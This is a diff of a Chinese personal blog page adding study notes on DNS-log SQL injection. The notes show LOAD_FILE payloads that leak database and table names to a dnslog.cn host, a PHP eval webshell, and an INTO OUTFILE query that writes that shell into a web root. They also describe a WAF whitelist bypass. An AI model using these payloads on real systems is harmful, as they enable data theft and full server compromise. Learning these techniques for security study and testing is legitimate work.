@@ -20,17 +20,17 @@
     var CONFIG = {"hostname":"dtxharry.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":false,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="随便写点自己的笔记">
+  <meta name="description" content="利用dns进行数据外带">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DNS注入">
 <meta property="og:url" content="https://dtxharry.github.io/2023/08/21/DNS%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Dtx&#39;s Realm">
-<meta property="og:description" content="随便写点自己的笔记">
+<meta property="og:description" content="利用dns进行数据外带">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-08-21T08:31:27.000Z">
-<meta property="article:modified_time" content="2023-08-21T08:31:27.045Z">
+<meta property="article:modified_time" content="2023-08-21T12:56:02.751Z">
 <meta property="article:author" content="dtxHarry">
-<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="https://dtxharry.github.io/2023/08/21/DNS%E6%B3%A8%E5%85%A5/">
@@ -222,11 +222,22 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2023-08-21 16:31:27" itemprop="dateCreated datePublished" datetime="2023-08-21T16:31:27+08:00">2023-08-21</time>
+              <time title="创建时间：2023-08-21 16:31:27 / 修改时间：20:56:02" itemprop="dateCreated datePublished" datetime="2023-08-21T16:31:27+08:00">2023-08-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
+                </span>
             </span>
 
           
+            <div class="post-description">利用dns进行数据外带</div>
 
         </div>
       </header>
@@ -237,7 +248,44 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
+        <h1 id="DNS注入原理"><a href="#DNS注入原理" class="headerlink" title="DNS注入原理"></a>DNS注入原理</h1><p>在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起请求，这个时候就可以通过DNS请求把想获得的数据外带出来。        </p>
+<p>对于sql盲注，常见的方法就是二分法去一个个猜，但是这样的方法麻烦不说，还很容易因为数据请求频繁导致被ban。  </p>
+<p>所以可以将select到的数据发送给一个url，利用dns解析产生的记录日志来查看数据。在遇到盲注的时候可以快速得到数据,减少和目标的交互.</p>
+<p>DNS注入 =&gt; DNS-LOG注入 【SQL注入的进阶】</p>
+<p>数据库其实可以发起网络请求,特定的函数可以让他可以去远程获取数据,基本原理为:让他请求某个域名，然后域名的二级域名用子查询拼接<br>                    (select database()).baidu.com =&gt; maoshe.baidu.com</p>
+<h1 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h1><h2 id="1、什么函数让数据库发起请求"><a href="#1、什么函数让数据库发起请求" class="headerlink" title="1、什么函数让数据库发起请求"></a>1、什么函数让数据库发起请求</h2><p> LOAD_FILE()   读取文件的函数       </p>
+<p>读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。 该文件所有字节可读，但文件内容必须小于max_allowed_packet（限制server接受的数据包大小函数，默认1MB）。 如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</p>
+<p>这个功能不是默认开启的，为了安全性，除了特别低的版本外，他们设置安全性的锁,需要在mysql配置文件加一句 secure_file_priv=<br>因此,load_file()函数是有限制条件的,对面未开启这个安全模式时是不能进行dns注入的</p>
+<p>它可以走文件共享协议去读取外部文件。用的是SMB协议（永恒之蓝）,<strong>所以目标是Linux不能使用dns注入(如果一个网站不允许访问外网也不能DNS注入)</strong></p>
+<h2 id="2-UNC路径"><a href="#2-UNC路径" class="headerlink" title="2.UNC路径"></a>2.UNC路径</h2><p>通用命名规则，也称通用命名规范、通用命名约定.</p>
+<p>UNC路径就是类似\softer这样的形式的网络路径。它符合 \\servername\sharename 格式，=&gt; <strong>文件共享 \\域名或IP\文件夹</strong></p>
+<p>其中 servername 是服务器名，sharename 是共享资源的名称。目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：\\servername\sharename\directory\filename。例如softer计算机的名为it168的共享文件夹，用UNC表示就是\\softer\it168。我们熟悉的命令行访问法访问网上邻居，实际上应该称作UNC路径访问法。不过UNC路径也可以这样写//servername/sharename   [强烈建议这样写,因为注意url中\转义字符,要\\,\\要变为\\\\]   </p>
+<h2 id="3-load-file和unc路径结合"><a href="#3-load-file和unc路径结合" class="headerlink" title="3.load_file和unc路径结合"></a>3.load_file和unc路径结合</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">load_file(<span class="string">&#x27;//a.r5a991.dnslog.cn/1select23&#x27;</span>)</span><br><span class="line"></span><br><span class="line">load_file(concat(<span class="string">&#x27;//&#x27;</span>,database(),<span class="string">&#x27;.r5a991.dnslog.cn/123&#x27;</span>))</span><br><span class="line"></span><br><span class="line">load_file(concat(<span class="string">&#x27;//&#x27;</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;.qelgp1.dnslog.cn/123&#x27;</span>))</span><br><span class="line"></span><br><span class="line">load_file(<span class="string">&#x27;//douphp.qelgp1.dnslog.cn/123&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>​    先执行子查询、执行了语句、最后开始Load_file，然后DNS有信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#拼接之后就相当于:</span><br><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="string">&#x27;//error.1806dl.dnslog.cn/abc&#x27;</span>);</span><br><span class="line">#数据库去访问error<span class="number">.1806</span>dl.dnslog.cn的服务器下的共享文件夹abc然后<span class="number">1806</span>dl.dnslog.cn的子域名的解析都是在某台服务器，然后他记录下来了有人请求访问了error<span class="number">.1806</span>dl.dnslog.cn，然后在DnsLog这个平台上面显示出来了</span><br></pre></td></tr></table></figure>
+<h2 id="4-如何才能看到DNS日志"><a href="#4-如何才能看到DNS日志" class="headerlink" title="4.如何才能看到DNS日志?"></a>4.如何才能看到DNS日志?</h2><h3 id="理论上"><a href="#理论上" class="headerlink" title="理论上:"></a>理论上:</h3><p>你需要自己搭建一台有公网IP的DNS服务器+购置新的域名(在域名设置中把域名的DNS指向你搭建的机器)<br>公网IP服务器（如果不是学生机要69/月） + 域名 （需要钱）便宜域名 .xyz </p>
+<h3 id="实际上"><a href="#实际上" class="headerlink" title="实际上:"></a>实际上:</h3><p>前辈已经帮你们搭了，有成套的DNS-LOG网站</p>
+<h1 id="课程外干货"><a href="#课程外干货" class="headerlink" title="课程外干货"></a>课程外干货</h1><h2 id="1-白名单"><a href="#1-白名单" class="headerlink" title="1.白名单"></a>1.白名单</h2><p>名单上的东西都是安全的，不检测</p>
+<p>因为对于txt,jpg文件进行传参不可能造成sql注入,所以老版本的安全狗不会检测后缀为.txt等的文件传承[大部分的漏洞是因为理解产生了偏差,对于waf的理解,对于web容器理解的不同]</p>
+<p>index3.php<br>index3.php/123.txt  </p>
+<p>以上俩路径返回的页面是一样的,因为找不到123.txt,所以就会网上级找,找到index3.php,这是nginx的一个特性</p>
+<h2 id="2-拿下目标服务器"><a href="#2-拿下目标服务器" class="headerlink" title="2.拿下目标服务器"></a>2.拿下目标服务器</h2><p>能打dns_log说明安全模式取消了。如果你权限够(以后会学提权)，且没有过滤的情况,可以尝试用webshell =&gt; 网站的木马（只要把webshell放到目标的网站根目录，就可以控制目标服务器）</p>
+<h3 id="PHP代码"><a href="#PHP代码" class="headerlink" title="PHP代码:"></a>PHP代码:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">8</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>​                                   =&gt;$_REQUEST[8] 接受8的传参<br>​                                   =&gt;eval 把字符串当作后端代码进行执行<br>​                                   =&gt; PHP代码很强大、执行系统命令、读取文件、删除文件、查看信息、发起请求都可以做到<br>​                                   =&gt; 利用工具。webshell管理工具（内置了一些功能，然后他会通过内置的PHP代码去传参）<br>​                                   =&gt; 最有名的就是：菜刀/蚁剑</p>
+<h3 id="webshell最大的难点："><a href="#webshell最大的难点：" class="headerlink" title="webshell最大的难点："></a>webshell最大的难点：</h3><p>如何把我的木马放到目标网站的根目录 （文件上传）</p>
+<p>解析漏洞：把文件当作PHP来执行 =&gt; 大部分的网站都是看后缀的.</p>
+<p>=&gt;如果能上传一个.php文件且里面代码会执行，那基本上对面的服务器你就拿下了.</p>
+<p>web容器 =&gt; 根据后缀判断需要让谁处理。 TXT\JPG\PHP\JSP(此处关联上面的白名单内容)</p>
+<h3 id="在数据库中："><a href="#在数据库中：" class="headerlink" title="在数据库中："></a>在数据库中：</h3><p>导出数据库语句查询结果</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">into</span> outfile  #导出多行</span><br><span class="line"><span class="keyword">into</span> dumpfile #导出单行</span><br></pre></td></tr></table></figure>
+<p>导出文件</p>
+<p>大部分的中小型网站，数据库和网站都是在一起的</p>
+<p>让目标网站报错以获取绝对路径：传参后面加[]  =&gt; id[]=123 , 因为这样子你的传参就是数组</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">into</span> outfile <span class="string">&#x27;C:/phpStudy/WWW/8.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>​                               </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> `news` <span class="keyword">WHERE</span> `id`<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;&lt;?php eval($_REQUEST[8])?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/phpStudy/WWW/6.php&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>sqlmap拿shell =&gt; 也是基于这个拿的</p>
+
     </div>
 
     
@@ -262,6 +310,9 @@
 
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+          </div>
 
         
 
@@ -335,6 +386,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DNS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="nav-text">DNS注入原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0"><span class="nav-text">具体实现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E4%BB%80%E4%B9%88%E5%87%BD%E6%95%B0%E8%AE%A9%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%91%E8%B5%B7%E8%AF%B7%E6%B1%82"><span class="nav-text">1、什么函数让数据库发起请求</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-UNC%E8%B7%AF%E5%BE%84"><span class="nav-text">2.UNC路径</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-load-file%E5%92%8Cunc%E8%B7%AF%E5%BE%84%E7%BB%93%E5%90%88"><span class="nav-text">3.load_file和unc路径结合</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E5%A6%82%E4%BD%95%E6%89%8D%E8%83%BD%E7%9C%8B%E5%88%B0DNS%E6%97%A5%E5%BF%97"><span class="nav-text">4.如何才能看到DNS日志?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%90%86%E8%AE%BA%E4%B8%8A"><span class="nav-text">理论上:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%99%85%E4%B8%8A"><span class="nav-text">实际上:</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%AF%BE%E7%A8%8B%E5%A4%96%E5%B9%B2%E8%B4%A7"><span class="nav-text">课程外干货</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E7%99%BD%E5%90%8D%E5%8D%95"><span class="nav-text">1.白名单</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%8B%BF%E4%B8%8B%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-text">2.拿下目标服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP%E4%BB%A3%E7%A0%81"><span class="nav-text">PHP代码:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#webshell%E6%9C%80%E5%A4%A7%E7%9A%84%E9%9A%BE%E7%82%B9%EF%BC%9A"><span class="nav-text">webshell最大的难点：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%EF%BC%9A"><span class="nav-text">在数据库中：</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -357,13 +409,13 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">2</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
